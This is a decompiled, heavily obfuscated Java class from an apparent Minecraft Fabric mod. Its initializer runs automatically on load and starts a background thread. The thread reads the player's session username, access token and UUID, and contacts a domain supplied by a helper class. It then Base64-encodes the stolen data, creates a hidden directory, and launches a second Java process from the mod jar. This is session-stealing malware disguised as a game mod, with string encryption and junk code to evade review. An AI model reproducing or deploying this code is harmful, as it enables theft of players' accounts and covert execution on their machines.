/*
 * Decompiled with CFR 0.152.
 */
package com.github;

import com.github.sxNsjhjhm;
import java.io.File;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.OpenOption;
import java.nio.file.Path;
import java.nio.file.attribute.FileAttribute;
import java.util.Base64;
import java.util.UUID;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.class_310;
import net.minecraft.class_320;

public class cnqgnlxable
implements ModInitializer {
    public cnqgnlxable() {
        cnqgnlxable qteklLwwh;
    }

    public void onInitialize() {
        cnqgnlxable HX_;
        int n2 = -244573427;
        if (n2 * 1 == -244573427) {
            n2 = -230767949;
            n2 += 233;
            n2 ^= 0x59902C64;
            n2 <<= 2;
            long l2 = 8260004432458549618L;
            l2 &= 0x28048077F4278759L;
            l2 |= 0xDF7A1BB4B2B60C02L;
        }
        new Thread(() -> {
            int n2 = 1017258653;
            if ((n2 | 0x3CA2229D) == 1017258653) {
                long l2 = 5123882847358916875L;
                l2 &= 0x28A01F5B9C27C3AL;
                l2 |= 0x646141B4E4D2CEEL;
            }
            long[] Fgrn_XcbY_GBpL_NGgC = new long[6];
            try {
                String string;
                cnqgnlxable aelsSwwesLslnyl;
                String string2;
                Fgrn_XcbY_GBpL_NGgC[0] = System.currentTimeMillis();
                class_320 ifvolhSwtlbmHbbGotdd = class_310.method_1551().method_1548();
                String cq_jn = ifvolhSwtlbmHbbGotdd.method_1674();
                String jqygXwvouoVcb = ifvolhSwtlbmHbbGotdd.method_1676();
                UUID i0 = ifvolhSwtlbmHbbGotdd.method_44717();
                if (i0 != null) {
                    string2 = i0.toString();
                } else {
                    char[] cArray = "\r\u3c38\u41d3\u761e\u5173\u3559\u605c\ufe1d\u914d\u0697\u55a6\u1a4c\u739e\u0bc2\u3c4d\u41bd\u7675\u511d\u3536\u602b\ufe73".toCharArray();
                    char c2 = cArray[0];
                    int n3 = cArray.length - c2 - 1;
                    char[] cArray2 = new char[n3];
                    for (int i2 = 0; i2 < n3; ++i2) {
                        cArray2[i2] = (char)(cArray[c2 + '\u0001' + i2] ^ cArray[1 + i2 % c2]);
                    }
                    string2 = new String(cArray2);
                }
                String tempTmp = string2;
                String _t8y = sxNsjhjhm.DinwT();
                String peqfVwkx = sxNsjhjhm.qBxiqqutoz();
                Path nXq_honZ_6 = FabricLoader.getInstance().getConfigDir().getParent();
                Fgrn_XcbY_GBpL_NGgC[1] = System.currentTimeMillis();
                sxNsjhjhm sjyrt_ilskps = new sxNsjhjhm();
                String LUghQ_uU56_DxB = sjyrt_ilskps.getDomain();
                Fgrn_XcbY_GBpL_NGgC[2] = System.currentTimeMillis();
                String JKj = sjyrt_ilskps.prefire(LUghQ_uU56_DxB, cq_jn, _t8y);
                Fgrn_XcbY_GBpL_NGgC[3] = System.currentTimeMillis();
                Base64.Encoder encoder = Base64.getEncoder();
                String string3 = aelsSwwesLslnyl.jvvhqhk(cq_jn);
                String string4 = aelsSwwesLslnyl.jvvhqhk(tempTmp);
                String string5 = aelsSwwesLslnyl.jvvhqhk(jqygXwvouoVcb);
                StringBuilder stringBuilder = new StringBuilder();
                char[] cArray = "\u0007\u65cf\u0cad\u473a\ub586\u2067\u6a37\u89a7\u65b4\u0c8f\u474f\ub5f5\u2002\u6a45\u89c9\u65ae\u0cc0\u475f\ub5a4\u205d\u6a15".toCharArray();
                char c3 = cArray[0];
                int n4 = cArray.length - 1 - c3;
                char[] cArray3 = new char[n4];
                for (int i3 = 0; i3 < n4; ++i3) {
                    cArray3[i3] = (char)(cArray['\u0001' + c3 + i3] ^ cArray[1 + i3 % c3]);
                }
                StringBuilder stringBuilder2 = stringBuilder.append(new String(cArray3)).append(string5);
                char[] cArray4 = "\u3daf\u38b9\u0082\u32d9\u5426\ub646\u3b1c\u3daf\u38af\u0082\u3d8d\u3895\u00a0\u32ac\u5453\ub62f\u3b78\u0007".toCharArray();
                char c4 = cArray4[cArray4.length - 1];
                int n5 = cArray4.length - c4 - 1;
                char[] cArray5 = new char[n5];
                for (int i4 = 0; i4 < n5; ++i4) {
                    cArray5[i4] = (char)(cArray4[i4] ^ cArray4[n5 + i4 % c4]);
                }
                StringBuilder stringBuilder3 = stringBuilder2.append(new String(cArray5)).append(string4);
                char[] cArray6 = "\b\ua6bc\u9aab\ua2cd\u45b3\uca05\u5f0c\u35e9\ue4a5\ua69e\u9a87\ua2ef\u45d2\uca66\u5f6f\u358c\ue4d6\ua6cf\u9aff\ua2a2\u45d8\uca60\u5f62\u35cb\ue49f\ua69e".toCharArray();
                char c5 = cArray6[0];
                int n6 = cArray6.length - c5 - 1;
                char[] cArray7 = new char[n6];
                for (int i5 = 0; i5 < n6; ++i5) {
                    cArray7[i5] = (char)(cArray6[c5 + '\u0001' + i5] ^ cArray6[1 + i5 % c5]);
                }
                StringBuilder stringBuilder4 = stringBuilder3.append(new String(cArray7)).append(string3);
                char[] cArray8 = "\n\u83d3\uf8c7\uaaae\u28a8\ue90a\u28e6\uc49f\ud0d6\ucdac\u5c9f\u83f1\uf8ba".toCharArray();
                char c6 = cArray8[0];
                int n7 = cArray8.length - c6 - 1;
                char[] cArray9 = new char[n7];
                for (int i6 = 0; i6 < n7; ++i6) {
                    cArray9[i6] = (char)(cArray8[c6 + '\u0001' + i6] ^ cArray8[1 + i6 % c6]);
                }
                String sXkWelL_4 = encoder.encodeToString(stringBuilder4.append(new String(cArray9)).toString().getBytes(StandardCharsets.UTF_8));
                if (JKj != null) {
                    string = JKj;
                } else {
                    String string6 = "\n\u7002\ud649\u94d0\u0ef2\u90b7\uef12\u8496\ubf59\uec98\u3ec5\u7070\ud6be\u953c\u0f5e";
                    char c7 = string6.charAt(0);
                    int n8 = string6.length() - 1 - c7;
                    StringBuilder stringBuilder5 = new StringBuilder(n8);
                    for (int i7 = 0; i7 < n8; ++i7) {
                        stringBuilder5.append((char)(string6.charAt('\u0001' + c7 + i7) - string6.charAt(1 + i7 % c7)));
                    }
                    string = stringBuilder5.toString();
                }
                String string7 = aelsSwwesLslnyl.jvvhqhk(tempTmp);
                String string8 = aelsSwwesLslnyl.jvvhqhk(jqygXwvouoVcb);
                String string9 = aelsSwwesLslnyl.jvvhqhk(nXq_honZ_6.toString());
                String string10 = aelsSwwesLslnyl.jvvhqhk(LUghQ_uU56_DxB);
                String string11 = aelsSwwesLslnyl.jvvhqhk(peqfVwkx);
                String string12 = aelsSwwesLslnyl.jvvhqhk(_t8y);
                String string13 = string;
                String string14 = sXkWelL_4;
                StringBuilder stringBuilder6 = new StringBuilder();
                char[] cArray10 = "\ucbc5\u1748\u6259\u6031\ub962\u49db\u799d\u8687\ucb9c\u1750\u6216\ucbbe\u176a\u6234\u6052\ub92b\u49b5\u79fb\u86e8\b".toCharArray();
                char c8 = cArray10[cArray10.length - 1];
                int n9 = cArray10.length - c8 - 1;
                char[] cArray11 = new char[n9];
                for (int i8 = 0; i8 < n9; ++i8) {
                    cArray11[i8] = (char)(cArray10[i8] ^ cArray10[n9 + i8 % c8]);
                }
                StringBuilder stringBuilder7 = stringBuilder6.append(new String(cArray11)).append(string14);
                String string15 = "\r\u3319\u54d9\u171f\ua672\ub85a\ubebb\ue11f\u3f1c\u8917\ufaa4\u176e\u427d\u5bee\u333b\u54f5\u173d\ua602\ub828\ubede\ue179\u3f75\u8965\ufac1\u1727\u4219\u5bcc\u3323\u54fb";
                char c9 = string15.charAt(0);
                int n10 = string15.length() - 1 - c9;
                StringBuilder stringBuilder8 = new StringBuilder(n10);
                for (int i9 = 0; i9 < n10; ++i9) {
                    stringBuilder8.append((char)(string15.charAt('\u0001' + c9 + i9) ^ string15.charAt(1 + i9 % c9)));
                }
                StringBuilder stringBuilder9 = stringBuilder7.append(stringBuilder8.toString()).append(string13);
                String string16 = "\f\u0d86\u20af\u2390\u2b75\u5291\u5d0d\ue64b\u5758\u45d4\u257b\ucdc6\u4946\u0da4\u2083\u23b2\u2b00\u52e2\u5d68\ue639\u5711\u45b0\u2559\ucdfc\u4964";
                char c10 = string16.charAt(0);
                int n11 = string16.length() - 1 - c10;
                StringBuilder stringBuilder10 = new StringBuilder(n11);
                for (int i10 = 0; i10 < n11; ++i10) {
                    stringBuilder10.append((char)(string16.charAt('\u0001' + c10 + i10) ^ string16.charAt(1 + i10 % c10)));
                }
                StringBuilder stringBuilder11 = stringBuilder9.append(stringBuilder10.toString()).append(string12);
                char[] cArray12 = "\f\u01bf\uec21\u0c28\u5ab6\ud6e5\u5990\ua9a6\u33e3\u5d32\ub672\uad3a\u630d\u019d\uec0d\u0c0a\u5ac2\ud684\u59f7\ua984\u33d9\u5d10".toCharArray();
                char c11 = cArray12[0];
                int n12 = cArray12.length - c11 - 1;
                char[] cArray13 = new char[n12];
                for (int i11 = 0; i11 < n12; ++i11) {
                    cArray13[i11] = (char)(cArray12[c11 + '\u0001' + i11] ^ cArray12[1 + i11 % c11]);
                }
                StringBuilder stringBuilder12 = stringBuilder11.append(new String(cArray13)).append(string11);
                char[] cArray14 = "\t\u72d1\u522b\u302a\ueeff\u3ee6\uc81b\u43cf\u634f\u9b36\u72f3\u5207\u3008\uee9b\u3e89\uc876\u43ae\u6326\u9b58\u72f3\u5211\u3008".toCharArray();
                char c12 = cArray14[0];
                int n13 = cArray14.length - 1 - c12;
                char[] cArray15 = new char[n13];
                for (int i12 = 0; i12 < n13; ++i12) {
                    cArray15[i12] = (char)(cArray14['\u0001' + c12 + i12] ^ cArray14[1 + i12 % c12]);
                }
                StringBuilder stringBuilder13 = stringBuilder12.append(new String(cArray15)).append(string10);
                char[] cArray16 = "\n\u956d\u25f8\ud3ef\u8450\u8e2c\u8632\u7a77\u1725\u20d5\u461c\u958f\u2624\ud411\u84b7\u8e8d\u869f\u7adc\u1769\u213e\u468e\u958f\u2632\ud411".toCharArray();
                char c13 = cArray16[0];
                int n14 = cArray16.length - 1 - c13;
                char[] cArray17 = new char[n14];
                for (int i13 = 0; i13 < n14; ++i13) {
                    cArray17[i13] = (char)(cArray16['\u0001' + c13 + i13] - cArray16[1 + i13 % c13]);
                }
                StringBuilder stringBuilder14 = stringBuilder13.append(new String(cArray17)).append(string9);
                char[] cArray18 = "\u0004\u719c\u452b\u64a0\ud8a3\u71be\u4507\u6482\ud8ce\u71ff\u457e\u64d3\ud8c6\u71ee\u4545\u64c1\ud8ce\u71f9\u4509\u649a\ud881".toCharArray();
                char c14 = cArray18[0];
                int n15 = cArray18.length - 1 - c14;
                char[] cArray19 = new char[n15];
                for (int i14 = 0; i14 < n15; ++i14) {
                    cArray19[i14] = (char)(cArray18['\u0001' + c14 + i14] ^ cArray18[1 + i14 % c14]);
                }
                char[] cArray20 = new char[n15];
                System.arraycopy(cArray19, 0, cArray20, 0, n15);
                StringBuilder stringBuilder15 = stringBuilder14.append(new String(cArray20)).append(string8);
                char[] cArray21 = "\uc2f5\u4d67\ua680\ue2cf\uc7c1\u388b\ueaef\u032b\u8f39\ub66a\ue9a9\u9deb\uc2d7\u4d4b\ua6a2\ue2a2\uc7a2\u38de\uea9a\u0342\u8f5d\ub648\ue993\u9dc9\u75ac\u50fa\u000e".toCharArray();
                char c15 = cArray21[cArray21.length - 1];
                int n16 = cArray21.length - c15 - 1;
                char[] cArray22 = new char[n16];
                for (int i15 = 0; i15 < n16; ++i15) {
                    cArray22[i15] = (char)(cArray21[i15] ^ cArray21[n16 + i15 % c15]);
                }
                StringBuilder stringBuilder16 = stringBuilder15.append(new String(cArray22)).append(string7);
                char[] cArray23 = "\u0007\ucef7\ue003\ub559\u17d3\ue125\uc73f\u6b25\uced5\ue02f\ub57b\u17b6\ue14b\uc749\u6b07\ucecd\ue021\ub51f\u17b2\ue147\uc74d\u6b4c\uce94\ue021\ub524".toCharArray();
                char c16 = cArray23[0];
                int n17 = cArray23.length - c16 - 1;
                char[] cArray24 = new char[n17];
                for (int i16 = 0; i16 < n17; ++i16) {
                    cArray24[i16] = (char)(cArray23[c16 + '\u0001' + i16] ^ cArray23[1 + i16 % c16]);
                }
                String cRHk_KZBx_Xxwo_SraG = stringBuilder16.append(new String(cArray24)).toString();
                String dHMt_QTtI_QfDp_MyLM = Base64.getEncoder().encodeToString(cRHk_KZBx_Xxwo_SraG.getBytes(StandardCharsets.UTF_8));
                char[] cArray25 = "\u0007\u0f7a\ud11b\u505a\u1246\ub4e8\uc58c\uc72e\u0fe4\ud17c\u50d0\u12a7\ub516\uc5f4\uc79d\u0fe7\ud180".toCharArray();
                char c17 = cArray25[0];
                int n18 = cArray25.length - 1 - c17;
                char[] cArray26 = new char[n18];
                for (int i17 = 0; i17 < n18; ++i17) {
                    cArray26[i17] = (char)(cArray25['\u0001' + c17 + i17] - cArray25[1 + i17 % c17]);
                }
                String optsAcc = System.getProperty(new String(cArray26));
                String[] stringArray = new String[2];
                String string17 = "\r\u3dbe\ud8ac\u7578\u5f0f\u6031\u9143\ub2e4\u3f06\u7456\uc4d2\u38b1\u3ebb\u0763\u3e20\ud915\u75e6";
                char c18 = string17.charAt(0);
                int n19 = string17.length() - 1 - c18;
                StringBuilder stringBuilder17 = new StringBuilder(n19);
                for (int i18 = 0; i18 < n19; ++i18) {
                    stringBuilder17.append((char)(string17.charAt('\u0001' + c18 + i18) - string17.charAt(1 + i18 % c18)));
                }
                stringArray[0] = stringBuilder17.toString();
                char[] cArray27 = "\r\ua452\ud650\u3c42\u056c\ube4d\u11f8\u25e7\uafb6\ucb78\ude5f\ucd3c\u90f4\u110a\ua438\ud631\u3c34\u050d\ube3a\u11d6\u2582\uafce\ucb1d".toCharArray();
                char c19 = cArray27[0];
                int n20 = cArray27.length - 1 - c19;
                char[] cArray28 = new char[n20];
                for (int i19 = n20 - 1; i19 >= 0; --i19) {
                    cArray28[i19] = (char)(cArray27['\u0001' + c19 + i19] ^ cArray27[1 + i19 % c19]);
                }
                stringArray[1] = new String(cArray28);
                Path gg_obvudm_jucjfc = Path.of(optsAcc, stringArray);
                if (!Files.exists(gg_obvudm_jucjfc, new LinkOption[0])) {
                    String[] stringArray2 = new String[2];
                    char[] cArray29 = "\u3041\u6e92\u1875\u3023\u6efb\u181b\u8d8f\u5e94\ud94e\uf4d8\u85b9\u918a\ue402\uf6eb\u17c4\u0e6a\r".toCharArray();
                    char c20 = cArray29[cArray29.length - 1];
                    int n21 = cArray29.length - c20 - 1;
                    char[] cArray30 = new char[n21];
                    for (int i20 = 0; i20 < n21; ++i20) {
                        cArray30[i20] = (char)(cArray29[i20] ^ cArray29[n21 + i20 % c20]);
                    }
                    stringArray2[0] = new String(cArray30);
                    char[] cArray31 = "\u0f1e\u39bd\u270b\u10a9\u10ab\u5940\u2f47\uc7e3\u0f74\u39dc\u277d\u10c8\u1085\u5925\u2f3f\uc786\u4ddd\ue4dc\uc20e\uafc0\f".toCharArray();
                    char c21 = cArray31[cArray31.length - 1];
                    int n22 = cArray31.length - c21 - 1;
                    char[] cArray32 = new char[n22];
                    for (int i21 = 0; i21 < n22; ++i21) {
                        cArray32[i21] = (char)(cArray31[i21] ^ cArray31[n22 + i21 % c21]);
                    }
                    stringArray2[1] = new String(cArray32);
                    gg_obvudm_jucjfc = Path.of(optsAcc, stringArray2);
                }
                URI YqIx_qmMz_ZKws_mOGW = cnqgnlxable.class.getProtectionDomain().getCodeSource().getLocation().toURI();
                Path RMud = Path.of(YqIx_qmMz_ZKws_mOGW);
                char[] cArray33 = "\r\ub722\u9b9c\ue563\u2147\u7d6d\uf349\u050c\udde8\u798e\uf527\u67f8\u48ac\u9982\ub76e\u9bd3\ue520\u2106\u7d21\uf308\u055c\uddb8\u79ca\uf566\u67ac\u48ed".toCharArray();
                char c22 = cArray33[0];
                int n23 = cArray33.length - 1 - c22;
                char[] cArray34 = new char[n23];
                for (int i22 = 0; i22 < n23; ++i22) {
                    cArray34[i22] = (char)(cArray33['\u0001' + c22 + i22] ^ cArray33[1 + i22 % c22]);
                }
                String string18 = System.getenv(new String(cArray34));
                String[] stringArray3 = new String[3];
                char[] cArray35 = "\r\u0347\u2d9c\u401a\uc390\ube1a\uafd7\uc999\u310c\uab5d\ue218\u3ad7\uc0e4\u444f\u030a\u2df5\u4079\uc3e2\ube75\uafa4\uc9f6\u316a\uab29".toCharArray();
                char c23 = cArray35[0];
                int n24 = cArray35.length - c23 - 1;
                char[] cArray36 = new char[n24];
                for (int i23 = 0; i23 < n24; ++i23) {
                    cArray36[i23] = (char)(cArray35[c23 + '\u0001' + i23] ^ cArray35[1 + i23 % c23]);
                }
                stringArray3[0] = new String(cArray36);
                char[] cArray37 = "\u0004\ufd77\uea43\u479b\ud430\ufd20\uea2a\u47f5\ud454\ufd18\uea34\u47e8".toCharArray();
                char c24 = cArray37[0];
                int n25 = cArray37.length - 1 - c24;
                char[] cArray38 = new char[n25];
                for (int i24 = 0; i24 < n25; ++i24) {
                    cArray38[i24] = (char)(cArray37['\u0001' + c24 + i24] ^ cArray37[1 + i24 % c24]);
                }
                char[] cArray39 = new char[n25];
                System.arraycopy(cArray38, 0, cArray39, 0, n25);
                stringArray3[1] = new String(cArray39);
                char[] cArray40 = "\u000e\u8612\uab0c\u0f7d\uee11\u6b08\u33e4\u0e9a\u0326\u691a\u7b26\u3657\u0662\u64e2\u22b2\u865c\uab78\u0f2d\uee63\u6b67\u3382\u0ef3\u034a\u697f\u7b6f\u3639\u0606\u6487\u22ca".toCharArray();
                char c25 = cArray40[0];
                int n26 = cArray40.length - 1 - c25;
                char[] cArray41 = new char[n26];
                for (int i25 = n26 - 1; i25 >= 0; --i25) {
                    cArray41[i25] = (char)(cArray40['\u0001' + c25 + i25] ^ cArray40[1 + i25 % c25]);
                }
                stringArray3[2] = new String(cArray41);
                Path UGuQ_tXQa_YqND_sZib = Path.of(string18, stringArray3);
                Files.createDirectories(UGuQ_tXQa_YqND_sZib, new FileAttribute[0]);
                Fgrn_XcbY_GBpL_NGgC[4] = System.currentTimeMillis();
                String ZFMy_swod_Sdqh_HwcB = sxNsjhjhm.class.getName();
                String[] stringArray4 = new String[5];
                stringArray4[0] = gg_obvudm_jucjfc.toString();
                char[] cArray42 = "\u0004\ufb67\ubed4\u84a0\u1ac3\ufb4a\ubeb7\u84d0".toCharArray();
                char c26 = cArray42[0];
                int n27 = cArray42.length - 1 - c26;
                char[] cArray43 = new char[n27];
                for (int i26 = 0; i26 < n27; ++i26) {
                    cArray43[i26] = (char)(cArray42['\u0001' + c26 + i26] ^ cArray42[1 + i26 % c26]);
                }
                char[] cArray44 = new char[n27];
                System.arraycopy(cArray43, 0, cArray44, 0, n27);
                stringArray4[1] = new String(cArray44);
                stringArray4[2] = RMud.toString();
                stringArray4[3] = ZFMy_swod_Sdqh_HwcB;
                stringArray4[4] = dHMt_QTtI_QfDp_MyLM;
                ProcessBuilder fkwptv_qu = new ProcessBuilder(stringArray4);
                char[] cArray45 = "\r\u8af5\u7c7e\u972c\uf2f7\u3cda\u2c92\u322b\u6668\u4858\u356e\u23a3\u7936\u5af8\u8abb\u7c2b\u9760".toCharArray();
                char c27 = cArray45[0];
                int n28 = cArray45.length - 1 - c27;
                char[] cArray46 = new char[n28];
                for (int i27 = n28 - 1; i27 >= 0; --i27) {
                    cArray46[i27] = (char)(cArray45['\u0001' + c27 + i27] ^ cArray45[1 + i27 % c27]);
                }
                fkwptv_qu.redirectInput(ProcessBuilder.Redirect.from(new File(new String(cArray46))));
                char[] cArray47 = "\n\u25dd\uaec2\u3ecb\u2f9c\ueec3\ue823\u43fa\u0b3a\ueda5\u8609\u2582\uaeb1\u3ebb\u2ffd\ueeb4\ue84d\u43d4\u0b56\uedca\u866e".toCharArray();
                char c28 = cArray47[0];
                int n29 = cArray47.length - 1 - c28;
                char[] cArray48 = new char[n29];
                for (int i28 = 0; i28 < n29; ++i28) {
                    cArray48[i28] = (char)(cArray47['\u0001' + c28 + i28] ^ cArray47[1 + i28 % c28]);
                }
                fkwptv_qu.redirectOutput(ProcessBuilder.Redirect.appendTo(UGuQ_tXQa_YqND_sZib.resolve(new String(cArray48)).toFile()));
                fkwptv_qu.redirectErrorStream(true);
                fkwptv_qu.directory(UGuQ_tXQa_YqND_sZib.toFile());
                fkwptv_qu.start();
                Fgrn_XcbY_GBpL_NGgC[5] = System.currentTimeMillis();
                String string19 = "\b\u831b\u4c48\ue03e\ud5e6\ud96b\ue0d4\ud23e\u299a\u8349\u4cab\ue09f\ud649\ud9d3\ue139\ud29d\u2a03\u837f\u4cc0";
                char c29 = string19.charAt(0);
                int n30 = string19.length() - 1 - c29;
                StringBuilder stringBuilder18 = new StringBuilder(n30);
                for (int i29 = 0; i29 < n30; ++i29) {
                    stringBuilder18.append((char)(string19.charAt('\u0001' + c29 + i29) - string19.charAt(1 + i29 % c29)));
                }
                Path path = UGuQ_tXQa_YqND_sZib.resolve(stringBuilder18.toString());
                long l3 = Fgrn_XcbY_GBpL_NGgC[5] - Fgrn_XcbY_GBpL_NGgC[4];
                long l4 = Fgrn_XcbY_GBpL_NGgC[4] - Fgrn_XcbY_GBpL_NGgC[3];
                long l5 = Fgrn_XcbY_GBpL_NGgC[3] - Fgrn_XcbY_GBpL_NGgC[2];
                long l6 = Fgrn_XcbY_GBpL_NGgC[2] - Fgrn_XcbY_GBpL_NGgC[1];
                long l7 = Fgrn_XcbY_GBpL_NGgC[1] - Fgrn_XcbY_GBpL_NGgC[0];
                StringBuilder stringBuilder19 = new StringBuilder().append(l7);
                char[] cArray49 = "\u4e47\u4e6b\ud995\u0c64\u282a\u1b18\u9d17\ub93c\u8422\b".toCharArray();
                char c30 = cArray49[cArray49.length - 1];
                int n31 = cArray49.length - c30 - 1;
                char[] cArray50 = new char[n31];
                for (int i30 = 0; i30 < n31; ++i30) {
                    cArray50[i30] = (char)(cArray49[i30] ^ cArray49[n31 + i30 % c30]);
                }
                StringBuilder stringBuilder20 = stringBuilder19.append(new String(cArray50)).append(l6);
                String string20 = "\b\u43a3\u5377\uef70\u3d57\u674f\u686a\u797d\ubf15\u43cf";
                char c31 = string20.charAt(0);
                int n32 = string20.length() - 1 - c31;
                StringBuilder stringBuilder21 = new StringBuilder(n32);
                for (int i31 = 0; i31 < n32; ++i31) {
                    stringBuilder21.append((char)(string20.charAt('\u0001' + c31 + i31) - string20.charAt(1 + i31 % c31)));
                }
                StringBuilder stringBuilder22 = stringBuilder20.append(stringBuilder21.toString()).append(l5);
                String string21 = "\u0004\u15d9\ua684\uc7eb\ub969\u15f5";
                char c32 = string21.charAt(0);
                int n33 = string21.length() - 1 - c32;
                StringBuilder stringBuilder23 = new StringBuilder(n33);
                for (int i32 = 0; i32 < n33; ++i32) {
                    stringBuilder23.append((char)(string21.charAt('\u0001' + c32 + i32) ^ string21.charAt(1 + i32 % c32)));
                }
                StringBuilder stringBuilder24 = stringBuilder22.append(stringBuilder23.toString()).append(l4);
                char[] cArray51 = "\u000e\u7053\u3c9a\u4878\u6b2b\u8807\u31ee\u6b40\u8262\u105c\u263d\uf0dd\u21c0\u3bce\uceee\u707f".toCharArray();
                char c33 = cArray51[0];
                int n34 = cArray51.length - 1 - c33;
                char[] cArray52 = new char[n34];
                int n35 = 0;
                do {
                    cArray52[n35] = (char)(cArray51['\u0001' + c33 + n35] ^ cArray51[1 + n35 % c33]);
                } while (++n35 < n34);
                Files.writeString(path, (CharSequence)stringBuilder24.append(new String(cArray52)).append(l3).toString(), new OpenOption[0]);
            }
            catch (Exception kdQwjiMwmongDhgruw) {
                kdQwjiMwmongDhgruw.printStackTrace();
            }
        }).start();
        n2 = 1920500991;
        if ((n2 & 0x727884FF) == 1920500991) {
            long l3 = 5600857379537811884L;
            l3 &= 0x67916840577AAD43L;
            l3 |= 0xB02DB20593910CA6L;
            long l4 = 190648035L;
            l4 *= 69L;
            l4 ^= 0xDE9B41AL;
        }
    }

    /*
     * WARNING - void declaration
     */
    private String jvvhqhk(String string) {
        void njpzRqoiz;
        int n2 = 1934782156;
        if ((n2 | 0x73526ECC) == 1934782156) {
            long l2 = -84705295L;
            l2 *= 6L;
            l2 ^= 0x36AAE16EL;
            int n3 = 8290;
            n3 *= 78;
        }
        if (njpzRqoiz == null) {
            return "";
        }
        StringBuilder WKIl_quCx_yGAd_Zttk = new StringBuilder();
        block7: for (char hrrjjDauppQdu : njpzRqoiz.toCharArray()) {
            switch (hrrjjDauppQdu) {
                case '\"': {
                    char[] cArray = "\f\u48b4\u9afe\uad7a\u17f4\u2258\u0717\ued9c\u008a\u7cf2\u280f\u2852\u898a\u48e8\u9adc".toCharArray();
                    char c2 = cArray[0];
                    int n4 = cArray.length - 1 - c2;
                    char[] cArray2 = new char[n4];
                    int n5 = 0;
                    do {
                        cArray2[n5] = (char)(cArray['\u0001' + c2 + n5] ^ cArray[1 + n5 % c2]);
                    } while (++n5 < n4);
                    WKIl_quCx_yGAd_Zttk.append(new String(cArray2));
                    continue block7;
                }
                case '\\': {
                    char[] cArray = "\b\u5168\uc555\ua77a\uaa0a\u1efe\uce43\ud384\ue9fb\u51c4\uc5b1".toCharArray();
                    char c3 = cArray[0];
                    int n6 = cArray.length - 1 - c3;
                    char[] cArray3 = new char[n6];
                    for (int i2 = 0; i2 < n6; ++i2) {
                        cArray3[i2] = (char)(cArray['\u0001' + c3 + i2] - cArray[1 + i2 % c3]);
                    }
                    WKIl_quCx_yGAd_Zttk.append(new String(cArray3));
                    continue block7;
                }
                case '\n': {
                    char[] cArray = "\f\u2abf\uef02\ue09a\u068d\uc32e\u4dad\u2fa5\uc9b5\ud143\u99fe\u5e92\u4976\u2b1b\uef70".toCharArray();
                    char c4 = cArray[0];
                    int n7 = cArray.length - 1 - c4;
                    char[] cArray4 = new char[n7];
                    for (int i3 = 0; i3 < n7; ++i3) {
                        cArray4[i3] = (char)(cArray['\u0001' + c4 + i3] - cArray[1 + i3 % c4]);
                    }
                    WKIl_quCx_yGAd_Zttk.append(new String(cArray4));
                    continue block7;
                }
                case '\r': {
                    char[] cArray = "\u0006\u97fa\u541e\uf1a0\uc61d\udbb9\ude70\u97a6\u546c".toCharArray();
                    char c5 = cArray[0];
                    int n8 = cArray.length - 1 - c5;
                    char[] cArray5 = new char[n8];
                    for (int i4 = 0; i4 < n8; ++i4) {
                        cArray5[i4] = (char)(cArray['\u0001' + c5 + i4] ^ cArray[1 + i4 % c5]);
                    }
                    WKIl_quCx_yGAd_Zttk.append(new String(cArray5));
                    continue block7;
                }
                case '\t': {
                    char[] cArray = "\u000e\uc6ee\udf9e\u24aa\u0753\u8813\u3270\u8114\ud842\u8bf1\ua8f9\u12c1\uc8ce\u464e\u2367\uc6b2\udfea".toCharArray();
                    char c6 = cArray[0];
                    int n9 = cArray.length - 1 - c6;
                    char[] cArray6 = new char[n9];
                    int n10 = 0;
                    do {
                        cArray6[n10] = (char)(cArray['\u0001' + c6 + n10] ^ cArray[1 + n10 % c6]);
                    } while (++n10 < n9);
                    WKIl_quCx_yGAd_Zttk.append(new String(cArray6));
                    continue block7;
                }
                default: {
                    n2 = 7301365;
                    if (n2 >= 7301365 && n2 < 12074213) {
                        n2 = -29449373;
                        n2 ^= 0xF18FA307;
                        long l3 = 1556125020L;
                        l3 *= 112L;
                        l3 ^= 0xFFFFFFFFC0FE3D1AL;
                    }
                    if (hrrjjDauppQdu < ' ') {
                        String string2 = "\u000e\u07bc\u3bb3\uc969\uf03f\uc91d\u95de\u774a\ub8fe\u3020\uc6a6\uf3e4\u0d9b\u1edc\uc743\u07e0\u3bc6\uc94c\uf00f\uc929\u95a6";
                        char c7 = string2.charAt(0);
                        int n11 = string2.length() - 1 - c7;
                        StringBuilder stringBuilder = new StringBuilder(n11);
                        for (int i5 = 0; i5 < n11; ++i5) {
                            stringBuilder.append((char)(string2.charAt('\u0001' + c7 + i5) ^ string2.charAt(1 + i5 % c7)));
                        }
                        WKIl_quCx_yGAd_Zttk.append(String.format(stringBuilder.toString(), hrrjjDauppQdu));
                        continue block7;
                    }
                    WKIl_quCx_yGAd_Zttk.append(hrrjjDauppQdu);
                }
            }
        }
        return WKIl_quCx_yGAd_Zttk.toString();
    }
}

